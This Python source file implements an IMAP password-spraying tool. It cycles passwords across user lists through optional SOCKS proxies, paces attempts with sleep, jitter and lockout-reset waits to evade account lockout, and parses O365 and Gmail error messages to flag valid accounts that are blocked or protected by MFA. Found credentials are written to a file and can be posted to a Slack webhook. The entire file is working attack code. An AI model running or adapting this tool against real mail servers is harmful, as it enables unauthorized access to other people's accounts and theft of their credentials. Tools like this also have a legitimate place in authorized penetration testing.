from core.webhooks.slack import SlackWebhook
from core.common.socksimap import *
from typing import List
from random import shuffle
from core.utils.helpers import wait, lockout_reset_wait
from urllib.parse import urlparse
from core.utils.messages import text_colors
from re import search

class IMAPSprayer:
    def __init__(self, *, target: str, port: int = None, ssl: bool, proxy: str = None, timeout: int = None):
        self.creds = {}
        self.invalid = 0
        self.timeout = timeout
        self.client = None
        if target is None:
            raise ValueError("target must be provided")
        self.target = target
        self.ssl = ssl
        if port is None:
            self.port = IMAP4_SSL_PORT if ssl else IMAP4_PORT
        else:
            self.port = port
        self.proxy = proxy


    def _new_client(self):
        if self.proxy:
            parsed = urlparse(self.proxy)
            if self.ssl:
                self.client = SocksIMAP4SSL(self.target, self.port, proxy_addr=parsed.hostname,
                proxy_port=parsed.port, rdns=False, username=parsed.username,
                password=parsed.password, proxy_type=parsed.scheme, timeout=self.timeout)
            else:
                self.client = SocksIMAP4(self.target, self.port, proxy_addr=parsed.hostname,
                proxy_port=parsed.port, rdns=False, username=parsed.username,
                password=parsed.password, proxy_type=parsed.scheme, timeout=self.timeout)

        else:
            if self.ssl:
                self.client = IMAP4_SSL(self.target, self.port, timeout=self.timeout)
            else:
                self.client = IMAP4(self.target, self.port, timeout=self.timeout)

    
    def spray(self, *, userlist: List[str],
                passwordlist: List[str],
                sleep: int, jitter: int, lockout: int,
                randomize: bool = False, slack: str = None, retry: int = 3):
        self.creds = {}
        self.invalid = 0
        last_index = len(passwordlist) - 1
    
        for index, password in enumerate(passwordlist):
            print("[*] Spraying password: %s" % password)

            if randomize:
                shuffle(userlist)
            count_users = len(userlist)
            for useridx, username in enumerate(userlist):
                # Sleep between each user
                if useridx > 0 and sleep > 0:
                    wait(sleep, jitter)

                print(
                    "[*] Current username (%3d/%d): %s"
                    % (useridx + 1, count_users, username)
                )

                # Create new client for each user
                retcount = 0
                loaded = None
                while loaded is None:
                    try:
                        self._new_client()
                        loaded = True
                    except BaseException as e:
                        retcount += 1
                        if retcount == retry:
                            print("[ERROR] %s" % e)
                            continue

                # Try login with credential
                retcount = 0
                issued = None
                err = None
                typ = ""
                data = None
                while issued is None:
                    try:
                        typ, data = self.client.login(username, password)
                        issued = True
                    except IMAP4.error as e:
                        issued = True
                        err = e.__str__()
                    except BaseException as e:
                        retcount += 1
                        if retcount == retry:
                            print("[ERROR] %s" % e)
                            issued = False
                if not issued:
                    continue
                else:
                    valid = False
                    if typ == "OK":
                        valid = True
                        self.creds[username] = {
                            "password": password,
                            "message": "OK"
                        }
                    # O365 valid but blocked account
                    elif err and search(r"(?i:LOGIN failed. Account is blocked. Login to your account via a web browser to verify your identity.)", err):
                        valid = True
                        self.creds[username] = {
                            "password": password,
                            "message": "Account is blocked. Try login via a web browser"
                        }
                    # Gmail 2FA enabled
                    elif err and search(r"(?i:Application-specific password required)", err):
                        valid = True
                        self.creds[username] = {
                            "password": password,
                            "message": "Application-specific password required - MFA is enabled"
                        }

                if valid:
                    print(
                        "%s[Found] %s:%s (%s)%s"
                        % (text_colors.green, username, password, self.creds[username]["message"], text_colors.reset)
                    )
                    # Remove user from list
                    userlist.remove(username)
                    # Send notification
                    if slack:
                        notify = SlackWebhook(slack)
                        notify.post(
                            f"Valid creds for {self.target}:\n{username}:{password} ({self.creds[username]['message']})"
                        )
                else:
                    print(
                        "%s[Invalid Creds] %s:%s (%s)%s"
                        % (text_colors.red, username, password, str(err), text_colors.reset)
                    )
                    self.invalid += 1

            # Wait for lockout period if not last password
            if index != last_index:
                lockout_reset_wait(lockout)


    # ==========
    # Statistics
    # ==========
    def spray_stats(self, output: str = 'valid_creds.txt', slack: str = None):
        stats_text = "\n%s\n[*] Password Spraying Stats\n%s\n" % ("=" * 27, "=" * 27)
        stats_text += "[*] Total Credentials Tested:  %d\n" % (
            len(self.creds) + self.invalid
        )
        stats_text += "[*] Valid Accounts:            %d\n" % len(self.creds)
        stats_text += "[*] Invalid Credentials:       %d\n" % self.invalid
        print(stats_text)
        if len(self.creds) > 0:
            print(f"[+] Writing valid credentials to the file: {output}...")
            with open(output, "w") as file_:
                for user in self.creds.keys():
                    file_.write("%s\n" % ("%s:%s\t(%s)" % (user, self.creds[user]["password"], self.creds[user]["message"])))
                    # Append to text
                    stats_text += "\n%s:%s" % (user, self.creds[user])
        if slack:
            webhook = SlackWebhook(slack)
            try:
                webhook.post(stats_text)
            except BaseException as e:
                print("[ERROR] %s" % e)
            else:
                print("[*] Webhook message sent")

                
